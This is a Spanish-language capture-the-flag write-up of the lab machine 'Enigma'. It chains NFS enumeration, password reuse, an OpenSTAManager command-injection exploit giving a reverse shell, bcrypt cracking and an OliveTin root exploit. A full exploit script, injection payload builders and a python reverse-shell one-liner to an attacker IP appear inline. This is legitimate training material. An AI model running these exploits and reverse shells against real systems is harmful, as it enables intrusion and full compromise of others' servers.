---
layout: default
title: "Enigma"
date: 2026-10-21
---

![](/assets/enigma1.png)
## Reconocimiento
Tiramos rustscan porque solo es un folder para el clasico Nmap
```zsh
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

### Puertos abiertos:
 ```zsh
  22/tcp    open      ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
  80/tcp    open      http      nginx 1.24.0 (Ubuntu)
  110/tcp   open      pop3      Dovecot pop3d
  111/tcp   open      rpcbind   2-4 (RPC #100000)
  143/tcp   open      imap      Dovecot imapd (Ubuntu)
  993/tcp   open      ssl/imap  Dovecot imapd (Ubuntu)
  995/tcp   open      ssl/pop3  Dovecot pop3d
  2049/tcp  open      nfs_acl   3 (RPC #100227)
  37887/tcp open      mountd    1-3 (RPC #100005)
  38123/tcp open      status    1 (RPC #100024)
  41095/tcp open      nlockmgr  1-4 (RPC #100021)
  41603/tcp open      mountd    1-3 (RPC #100005)
  60927/tcp open      mountd    1-3 (RPC #100005)
 ```

Lo que tenemos delante es una maquina con NFS/RPC expuesto la via mas probable es **enumerar exports NFS** montarlos y **buscar credenciales/correo** 

**Enumeracion RPC y exports NFS**
```zsh
cybrsex /workspace # rpcinfo -p $IP                                                      
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  56119  mountd
    100005    1   tcp  37887  mountd
    100005    2   udp  36405  mountd
    100005    2   tcp  60927  mountd
    100005    3   udp  36094  mountd
    100005    3   tcp  41603  mountd
    100024    1   udp  54660  status
    100024    1   tcp  38123  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  37549  nlockmgr
    100021    3   udp  37549  nlockmgr
    100021    4   udp  37549  nlockmgr
    100021    1   tcp  41095  nlockmgr
    100021    3   tcp  41095  nlockmgr
    100021    4   tcp  41095  nlockmgr
```

```zsh
cybrsex /workspace # showmount -e $IP
Export list for 10.129.141.208:
/srv/nfs/onboarding *
```
Tenemos un NFS export abierto a todos (`*` = sin restricción de IP)

**Qué es NFS realmente?**

NFS (Network File System) permite que una carpeta del servidor remoto aparezca como si fuera una carpeta local tuya. No es “descargar archivos” es literalmente mapear `/srv/nfs/onboarding` del server a por ejemplo, `/mnt/nfs` en tu maquina. Una vez montado, `ls /mnt/nfs` te muestra el contenido real del server, y si tienes permisos de escritura, lo que escribes ahi se escribe en el server.

**Por qué esto es relevante ofensivamente?**

El riesgo clasico es `no_root_squash`. Por defecto, NFS hace “squash” o "degrada" al usuario root remoto a `nobody` para evitar que si tu eres root en tu maquina, tambien seas root sobre los archivos del server. Si el export tiene `no_root_squash` configurado, tu root local es = a root remoto sobre esos archivos. Eso es tu vector potencial: si puedes escribir un binario SUID ahi desde tu lado (como root), y ese mismo path es ejecutable del lado del server por un usuario normal, te da escalada de privilegios. Pero antes de pensar en eso, primero hay que ver **que hay ahi dentro**.


```zsh
mkdir -p /mnt/nfs
sudo mount -t nfs -o nolock,addr=$IP,vers=3 $IP:/srv/nfs/onboarding /mnt/nfs
ls -la /mnt/nfs
total 12
drwxr-xr-x 2 root root 4096 Feb 19  2026 .
drwxr-xr-x 4 root root 4096 Oct 21 00:01 ..
-rw-r--r-- 1 root root 1751 Feb 19  2026 New_Employee_Access.pdf
```
- `-t nfs`: tipo de filesystem
- `-o nolock`: evita que intente usar el NLM (lock manager) que esta corriendo en el puerto 41095, a veces falla el mount si lock está mal configurado, nolock lo evita
- `addr=$IP`arregla un bug conocido que estaba teniendo
- `vers=3` especifica la versioon (ya que si no funcionaba con la 3 funcionaria con la 4)

**El NFS de onboarding filtro un archivo que parece "jugoso", al revisarlo nos damos cuenta que son creds**
![](/assets/enigma2.png)

Si nos dirigimos a la URL que nos manda veremos que hay un login panel **Roundcube**, al autenticarnos como **kevin**, lo primero que vemos es este correo del usuario `sara@enigma.htb`.
![](/assets/enigma3.png)

Al ver que es un usuario de correo con **el mismo formato de correo** intento autenticarme como `sara@enigma.htb` con la misma contraseña `Enigma2024!`, esto lo pruebo ya que es comun que en correos institucionales o empresariales, otorguen correos con la misma contraseña. Asi que si algun usuario **no cambio la contraseña por defecto** podriamos autenticarnos como ellos (asi como hicimos con **kevin**).

![](/assets/enigma4.png)

Como en muchos casos, funciono y nos dieron una nueva URL (la cual es una login page) y credenciales para esta misma, al introducirlas vermos que tenemos acceso a **OpenSTAManager**, un software de gestion empresarial open-source (ERP ligero: facturación, tareas, clientes, inventario) escrito en PHP, bastante usado en PyMEs. 

OpenSTAManager tuvo varios CVEs de RCE autenticado (inyección SQL que escala a RCE, o subida de archivos arbitraria vía algun modulo de “backup” o “import”). Ya tenemos acceso admin autenticado que es exactamente el prerequisito que la mayoría de esos CVEs necesitan. 

Revisando la version del Software me doy cuenta que tenemos  la version (`2.9.8`), para esta version existe el `CVE-2025-69212` con una severidad de 9.4 ya que permite RCE como web server user. 

###### **Vulnerability Details**

OpenSTAManager v2.9.8 y versiones anteriores contienen una vulnerabilidad critica de OS Command Injection en la función de decodificacion de archivos P7M (XML firmado). El metodo `decodeP7M()` en `src/Util/XML.php` pasa un nombre de archivo controlado por el usuario directamente a la función `exec()` de PHP sin sanitizacion, permitiendo a un atacante autenticado ejecutar comandos arbitrarios del sistema en el servidor.

**Root Cause**

```php
// src/Util/XML.php:100
public static function decodeP7M($file)
{
    $directory = pathinfo($file, PATHINFO_DIRNAME);
    $output_file = $directory.'/'.basename($file, '.p7m');

    exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
}
```

El parametro `$file` que proviene del nombre de archivo de un `.p7m` contenido dentro de un ZIP subido a la aplicacion se concatena directamente en el comando de shell. Esta envuelto en comillas dobles, pero nunca se sanitiza con `escapeshellarg()`. Las comillas dobles en bash no constituyen un contexto seguro: permiten expansión de variables, command substitution, y crucialmente, un atacante que controla el contenido del string puede cerrar la comilla anticipadamente e inyectar comandos adicionales que el shell interpretara como instrucciones separadas, delimitadas por `;`.

A diferencia de un RCE pre-auth, esta vulnerabilidad exige que el atacante posea una sesion valida con permisos para subir e importar archivos a traves del modulo correspondiente de la aplicacion (en nuestro caso, importación de documentos firmados). No requiere auth bypass, XSS ni CSRF, es una explotación directa post-auth.

## Explotacion Inicial 
### Sell como www-data 
Para explotar esta vulnerabilidad me apoyare de este repositorio (https://github.com/BridgerAlderson/CVE-2025-69212-PoC/tree/main) que te automatiza y facilita toda la explotacion inicial dandome una reverse shell dentro del sistema.

```zsh
python3 exploit.py -t http://support_001.enigma.htb -u admin -p Ne3s4rtars78s --reverse-shell 10.10.17.177 4444

  _______      ________    ___   ___ ___  _____         __ ___ ___  __ ___
 / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|       / // _ \__ \/_ |__ \
| |     \ \  / /| |__ ______ ) | | | | ) | |__ ______ / /| (_) | ) || |  ) |
| |      \ \/ / |  __|______/ /| | | |/ /|___ \______| '_ \__, |/ / | | / /
| |____   \  /  | |____    / /_| |_| / /_ ___) |     | (_) |/ // /_ | |/ /_
 \_____|   \/   |______|  |____|\___/____|____/       \___//_/|____||_|____|

    OpenSTAManager <= 2.9.8  |  OS Command Injection
    P7M File Processing — decodeP7M() exec() sink

  CVE-2025-69212 Proof of Concept

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [*] Authenticating as admin...
  [+] Authenticated successfully.
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ══════════════════════════════════════════════════════════════
  ║ PLUGIN DETECTION
  ══════════════════════════════════════════════════════════════
  [*] Scanning for P7M vulnerable plugin...
  [*] Found 84 module(s).
  [+] Found 2 candidate(s).
  ├─ Module ID: 14
  ├─ Plugin ID: 21
  └─ Upload endpoint: save → http://support_001.enigma.htb/actions.php
  ══════════════════════════════════════════════════════════════


  ══════════════════════════════════════════════════════════════
  ║ REVERSE SHELL
  ══════════════════════════════════════════════════════════════
  ├─ Method: bash
  └─ Target: 10.10.17.177:4444

  [!] Start listener: nc -lvnp 4444

  [?] Press Enter when ready...
  [*] Delivering payload...
  [*] Switched to working module: 15/19
  [+] Payload delivered!
  ══════════════════════════════════════════════════════════════


  ─── Stats: 88 requests in 68.7s ───
```

```zsh
nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.142.121.
Ncat: Connection from 10.129.142.121:45586.
bash: cannot set terminal process group (1534): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@enigma:~/html/openstamanager$ 
```
Tenemos shell

Enumerando un poco la pagina encontramos `config.inc.php` en la carpeta de la configuracion de openstamanager si lo abrimos vemos esto:

```bash
www-data@enigma:~/html/openstamanager$ cat config.inc.php
cat config.inc.php
<?php

/*
 * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
 * Copyright (C) DevCode s.r.l.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];

// Tema selezionato per il front-end
$theme = 'default';

// Impostazioni di sicurezza
$redirectHTTPS = false; // Redirect automatico delle richieste da HTTP a HTTPS
$disableCSRF = true; // Protezione contro CSRF

// Impostazioni di debug
$debug = false;

$disable_hooks = false;

// Permette di accedere solo con un ip (da utilizzare per manutenzione)
$maintenance_ip = '';

// Personalizzazione dei gestori dei tag personalizzati
$HTMLWrapper = null;
$HTMLHandlers = [];
$HTMLManagers = [];

// Lingua del progetto (per la traduzione e la conversione numerica)
$lang = 'en_GB';
// Personalizzazione della formattazione di timestamp, date e orari
$formatter = [
    'timestamp' => 'd/m/Y H:i',
    'date' => 'd/m/Y',
    'time' => 'H:i',
    'number' => [
        'decimals' => ',',
        'thousands' => '',
    ],
];

// Ulteriori file CSS e JS da includere
$assets = [
    'css' => [],
    'print' => [],
    'js' => [],
];

// Configura il limite di tempo di esecuzione del file cron.php
$php_time_limit = '';
```

Al ver eso vemos que hay nuevo usuario: **`brollin`** con password `Fri3nds@9099`, directo del DB config de OpenSTAManager. Ese nombre no había aparecido antes porque no es un usuario del OS, **es un usuario de la base de datos MySQL**

**Enumeracion de la DB**
```bash
mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager -e "SHOW TABLES;"
```
- La flag -e porque me evita usar el modo interactivo de mysql, lo que me evita la posibilidad que mi shell se cuelgue o comporte raro. 

Dentro de ahi vemos la tabla `zz_users`, revisaremos su contenido
```bash
mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager -e "SELECT * FROM zz_users;"
<calhost openstamanager -e "SELECT * FROM zz_users;"
mysql: [Warning] Using a password on the command line interface can be insecure.
id	username	password	email	idanagrafica	idgruppo	enabled	created_at	updated_at	reset_token	image_file_id	options
1	admin	$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu	admin@enigma.htb	1	1	1	2026-02-18 19:26:52	2026-02-18 19:26:52	NULL	NULL	
2	haris	$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC	haris@enigma.htb	1	5	1	2026-02-18 20:58:28	2026-05-26 11:07:03	NULL	NULL	
```

Tenemos nuevo usuario: **`haris`**, con hash bcrypt (`$2y$10$...`) de la tabla de usuarios de la app. Probaremos crackear el hash `bcrypt` y aunque bcrypt (`-m 3200`) es intencionalmente lento de crackear (por diseño, para resistir brute-force), asi que si la password es fuerte esto puede tardar mucho, pero lo probaremos como opcion en segundo plano

```zsh
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash.txt
```

```zsh
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
**Resultado: `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends`

La hemos roto, **`bestfriends`**. Es un poco interesante que haya caído tan rapido ya que tardo al rededor de 6 segundos, esto porque este es un laboratorio y si pusieran contraseñas mas largas tardariamos una eternidad en resolver el lab. 

Como dato que me parecio gracioso es que el user `haris` tenga la password `bestfriends` ya que justamente conecta la narrativa con `brollin` (el user que filtro la cred). Por si tenias la duda `haris` + `brollin` son `bestfriends` XD.

Una ves con la contraseña nos autenticaremos como `haris`
```bash
su haris
Password: bestfriends
haris@enigma:~$ 
```
****a este punto agarramos la user flag***

## Privilege Escalation

Como no funciono la clasica `sudo -l` probe con `ss -lntp` y hubo un puerto que me parecio raro e interesante. 
```zsh
LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
```
“1337” = “leet” en jerga hacker, es un puerto clásico que la gente usa para apps custom/debug. Vale la pena revisar antes de ir a LinPEAS 

```bash
haris@enigma:/$ curl -v http://127.0.0.1:1337
curl -v http://127.0.0.1:1337
*   Trying 127.0.0.1:1337...
* Connected to 127.0.0.1 (127.0.0.1) port 1337
> GET / HTTP/1.1
> Host: 127.0.0.1:1337
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Content-Length: 2371
< Content-Type: text/html; charset=utf-8
< Last-Modified: Wed, 04 Mar 2026 09:48:38 GMT
< Date: Wed, 21 Oct 2026 18:34:10 GMT
< 
<!DOCTYPE html>

<html lang = "en">
	<head>
		<meta charset = "UTF-8" />
		<meta name = "viewport" content = "width=device-width, initial-scale=1.0" />
		<meta name = "description" content = "Give safe and simple access to predefined shell commands from a web interface." />

		<title>OliveTin</title>


		<link rel = "shortcut icon" type = "image/png" href = "/assets/OliveTinLogo-jRx-Gghe.png" />

		<link rel = "apple-touch-icon" sizes="57x57" href="/assets/OliveTinLogo-57px-B3yOXIxP.png" />
		<link rel = "apple-touch-icon" sizes="120x120" href="/assets/OliveTinLogo-120px-BZ3kS-xp.png" />
		<link rel = "apple-touch-icon" sizes="180x180" href="/assets/OliveTinLogo-180px-DBoTqUbn.png" />

		<base href = "/" />
		<script type="module" crossorigin src="/assets/index-Cr_VwSNJ.js"></script>
		<link rel="stylesheet" crossorigin href="/assets/index-BzcwB5yK.css">
	</head>

	<body>
		<slot id = "app" />

		<noscript>
			<div class = "error">Sorry, JavaScript is required to use OliveTin.</div>
		</noscript>

		<dialog title = "Big Error Message" id = "big-error" class = "error padded-content">

		</dialog>

		<script type = "text/javascript">
			const bigErrorDialog = document.getElementById('big-error')

			/**
			This is the bootstrap code, which relies on very simple, old javascript
			to at least display a helpful error message if we can't use OliveTin.
			*/
			window.showBigError = function (type, friendlyType, message, isFatal) {
				console.error('Error ' + type + ': ', message)
				return;

				bigErrorDialog.innerHTML = '<h1>Error ' + friendlyType + '</h1><p>' + message + "</p><p><a href = 'http://docs.olivetin.app/troubleshooting/err-" + type + ".html' target = 'blank'/>" + type + " error in OliveTin Documentation</a></p>"

				if (isFatal) {
					bigErrorDialog.innerHTML += '<p>You will need to refresh your browser to clear this message.</p>'
				} else {
					bigErrorDialog.innerHTML += '<p>This error message will go away automatically if the problem is solved.</p>'
				}

				bigErrorDialog.showModal()

				console.error('Error ' + type + ': ', message)
			}

			window.clearBigErrors = function () {
				bigErrorDialog.close()
			}
		</script>

		<script type = "text/javascript" nomodule>
			showBigError("js-modules-not-supported", "Sorry, your browser does not support JavaScript modules.", null)
		</script>

	</body>
</html>
* Connection #0 to host 127.0.0.1 left intact
```

Sale **OliveTin** la descripcion lo dice todo: _“Give safe and simple access to predefined shell commands from a web interface.”_ Es una herramienta que expone botones en una UI web, cada uno mapeado a un comando shell predefinido en un archivo de config, suena como algo inutil pero la verdadera pregunta es: **¿con qué usuario corre ese proceso?** 

```bash
ps aux | grep -i olivetin
ps aux | grep -i olivetin
root        1522  0.0  0.4 1240144 16812 ?       Ssl  15:05   0:00 /usr/local/bin/OliveTin
haris       3747  0.0  0.0   6544  2348 pts/0    S+   18:37   0:00 grep --color=auto -i olivetin
```
Confirmado: **corre como root** `root 1522  0.0  0.4 1240144 16812 ?  Ssl  15:05   0:00 /usr/local/bin/OliveTin`

El puerto 1337 esta encendido y escuchando, pero **solo en la interfaz de loopback de la maquina víctima** (`127.0.0.1`). Eso significa que solo acepta conexiones que se originen desde dentro de la maquina. Nosotros desde afuera, por mas que tengamos la IP de la victima, nunca vamos a poder hacer `curl http://10.129.141.208:1337` porque el proceso ni siquiera esta escuchando en la interfaz de red externa (`0.0.0.0` o la IP real), solo en loopback.

Investigando un poco me di cuenta de que hay un PoC para este CVE (`CVE-2026-30225`) que tambien nos facilitara muchisimo el hacer todo manualmente (https://github.com/hackerking24/CVE-2026-30225-OliveTin-RCE/tree/master).

**Creamos `exploit.py` en maquina victima:**
```bash
cat << 'EOF' > exploit.py
#!/usr/bin/env python3
r"""
OliveTin  -  unauthenticated action execution -> RCE  (+ CVE-2026-30225)
=======================================================================
"""
from __future__ import annotations

import argparse
import json
import sys

try:
    import requests
    from requests.packages.urllib3 import disable_warnings  # type: ignore
    disable_warnings()
except ImportError:
    sys.exit("[!] pip install requests")

NO_VALIDATION_TYPES = {"password", "raw_string_multiline", "checkbox"}


class OliveTin:
    def __init__(self, base: str, cookie: str | None = None, timeout: int = 20):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.h = {"Content-Type": "application/json"}
        if cookie:
            self.h["Cookie"] = cookie

    def _call(self, method: str, body: dict) -> requests.Response:
        return requests.post(f"{self.base}/api/{method}", headers=self.h,
                             data=json.dumps(body), timeout=self.timeout, verify=False)

    def whoami(self) -> dict:
        try:
            return self._call("WhoAmI", {}).json()
        except Exception:
            return {}

    def dashboard(self) -> dict:
        try:
            return self._call("GetDashboard", {}).json()
        except Exception:
            return {}

    def start_and_wait(self, action_id: str, arguments: list[dict]) -> dict:
        r = self._call("StartActionAndWait",
                       {"actionId": action_id, "arguments": arguments})
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"_status": r.status_code, "_raw": r.text}

    def start(self, binding_id: str, arguments: list[dict]) -> dict:
        r = self._call("StartAction",
                       {"bindingId": binding_id, "arguments": arguments})
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"_status": r.status_code, "_raw": r.text}

    def restart_action(self, tracking_id: str) -> dict:
        r = self._call("RestartAction", {"executionTrackingId": tracking_id})
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"_status": r.status_code, "_raw": r.text}


def iter_actions(node):
    if isinstance(node, dict):
        a = node.get("action")
        if a:
            yield a
        for v in node.values():
            yield from iter_actions(v)
    elif isinstance(node, list):
        for v in node:
            yield from iter_actions(v)


def cmd_check(ot: OliveTin) -> None:
    who = ot.whoami()
    print(f"[*] WhoAmI             : {who.get('authenticatedUser','?')} "
          f"(group={who.get('usergroup','?')}, provider={who.get('provider','?')})")
    if who.get("authenticatedUser") == "guest":
        print("[+] acting as GUEST - if guest has exec, no login is needed")

    dash = ot.dashboard()
    actions = list(iter_actions(dash))
    print(f"[*] visible action bindings: {len(actions)}")
    hot = []
    for a in actions:
        names = [x.get("name") for x in a.get("arguments", [])]
        types = {x.get("name"): x.get("type") for x in a.get("arguments", [])}
        risky = [n for n, t in types.items() if t in NO_VALIDATION_TYPES]
        flag = "  <-- injectable arg(s): " + ",".join(risky) if risky else ""
        print(f"    - {a.get('bindingId'):38} canExec={str(a.get('canExec')):5} "
              f"{a.get('title')!r} args={names}{flag}")
        if risky:
            hot.append((a.get("bindingId"), risky))
    if hot:
        print("\n[+] candidate actions for injection:")
        for bid, risky in hot:
            print(f"      --action {bid}  --inject {risky[0]}  --cmd 'id'")
    else:
        print("\n[!] no action with a no-validation argument is visible via the "
              "dashboard.\n    (backup_database on HTB Enigma is NOT on a dashboard "
              "- try --action backup_database anyway.)")

    print()
    cmd_test_restart(ot, quiet=False)


def cmd_test_restart(ot: OliveTin, quiet: bool = True) -> None:
    seed = ot.start_and_wait("date", [])
    tid = (seed.get("logEntry") or {}).get("executionTrackingId", "")
    if not tid:
        print("[!] could not seed a tracking id (is 'date' action present?)")
        return
    out = ot.restart_action(tid)
    if out.get("code") == "not_found" and 'ID  ' in out.get("message", ""):
        print("[i] CVE-2026-30225: RestartAction is half-implemented on this build "
              "(<=3000.10.x) - forwards empty BindingId, no re-exec. Not usable here.")
    elif "logEntry" in out:
        le = out["logEntry"]
        print(f"[+] CVE-2026-30225: RestartAction re-executed as "
              f"user={le.get('user')!r} (auth context dropped).")
    else:
        print(f"[i] CVE-2026-30225: RestartAction response: {json.dumps(out)[:200]}")


def build_injection(cmd: str, quote: str) -> str:
    if quote == "single":
        return f"x'; {cmd}; echo __OT_DONE__ #"
    if quote == "double":
        return f'x"; {cmd}; echo __OT_DONE__ #'
    return f"x; {cmd}; echo __OT_DONE__ #"


def cmd_exploit(ot: OliveTin, args) -> None:
    arguments = []
    for kv in args.set:
        k, _, v = kv.partition("=")
        arguments.append({"name": k, "value": v})
    if args.inject:
        arguments.append({"name": args.inject,
                          "value": build_injection(args.cmd, args.quote)})

    who = ot.whoami().get("authenticatedUser", "?")
    print(f"[*] as {who}: StartActionAndWait actionId={args.action!r}")
    print(f"[*] arguments: {json.dumps(arguments)}")
    out = ot.start_and_wait(args.action, arguments)

    le = out.get("logEntry")
    if not le:
        print(f"[!] no logEntry in response:\n{json.dumps(out, indent=2)[:1500]}")
        return
    print(f"[+] exitCode={le.get('exitCode')}  ranAs={le.get('user')!r}  "
          f"trackingId={le.get('executionTrackingId')}")
    print("-" * 64)
    print(le.get("output", ""), end="")
    print("-" * 64)


def main() -> None:
    p = argparse.ArgumentParser(
        description="OliveTin unauthenticated action execution -> RCE (+ CVE-2026-30225 probe)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-u", "--url", required=True, help="OliveTin base URL")
    p.add_argument("--cookie", help="olivetin-sid-local=...")
    sub = p.add_subparsers(dest="mode", required=True)

    sub.add_parser("check", help="recon")
    sub.add_parser("test-restart", help="probe CVE")

    e = sub.add_parser("exploit", help="run command")
    e.add_argument("--action", required=True)
    e.add_argument("--set", action="append", default=[], metavar="NAME=VALUE")
    e.add_argument("--inject", metavar="NAME")
    e.add_argument("--quote", choices=["single", "double", "none"], default="single")
    e.add_argument("--cmd")

    args = p.parse_args()
    ot = OliveTin(args.url, args.cookie)

    if args.mode == "check":
        cmd_check(ot)
    elif args.mode == "test-restart":
        cmd_test_restart(ot, quiet=False)
    elif args.mode == "exploit":
        if args.inject and not args.cmd:
            p.error("--inject requires --cmd")
        cmd_exploit(ot, args)


if __name__ == "__main__":
    main()
EOF
```

**Damos permisos de ejecucion:**
```bash
chmod +x exploit.py
```

**Ejecutamos `exploit.py`:**
```bash
python3 exploit.py -u http://127.0.0.1:1337 exploit \
    --action backup_database --set db_user=root --set db_name=x \
    --inject db_pass --quote single --cmd 'id; cat /root/root.txt'
```
***output***: `uid=0(root) gid=0(root) groups=0(root) 0648aa3459cae0660fdb7c98056c76db

**Igual si quisieramos una shell interactiva editariamos el `exploit.py`  anterior removiendo esto:**
```python
def build_injection(cmd: str, quote: str) -> str:
    if quote == "single":
        return f"x'; {cmd}; echo __OT_DONE__ #"
    if quote == "double":
        return f'x"; {cmd}; echo __OT_DONE__ #'
    return f"x; {cmd}; echo __OT_DONE__ #"
```
**Por esto:**
```python
def build_injection(cmd: str, quote: str) -> str:
    if quote == "single":
        return f"x'; {cmd} #"
    if quote == "double":
        return f'x"; {cmd} #'
    return f"x; {cmd} #"
```
_El primer script añade el marcador **`; echo __OT_DONE__ #`** al  payload lo que nos cortaria la conexion_

**Damos permisos de ejecucion:**
```bash
chmod +x exploit.py
```

**Iniciamos nuestro listener**
```zsh
nc -lvnp 4443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
```

**Y correriamos esto (poniendo tu IP y tu puerto)**
```bash
python3 exploit.py -u http://127.0.0.1:1337 exploit \
    --action backup_database --set db_user=root --set db_name=x \
    --inject db_pass --quote single \
    --cmd 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"TU.IP.EJEM.PLO\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")" &'
```

**Nos conectamos:**
```zsh
nc -lvnp 4443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.129.142.205.
Ncat: Connection from 10.129.142.205:39878.
root@enigma:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@enigma:/# 
```
